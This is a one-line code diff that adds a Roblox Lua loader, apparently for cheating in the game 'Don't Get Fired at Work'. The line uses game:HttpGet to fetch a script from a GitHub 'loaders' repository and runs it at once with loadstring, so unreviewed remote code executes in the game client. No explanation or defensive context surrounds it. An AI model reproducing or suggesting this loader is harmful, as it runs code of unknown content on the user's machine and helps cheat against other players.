@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/don-t-get-fired-at-work-spam6-qjc9y6tymc6mjx.lua"))()
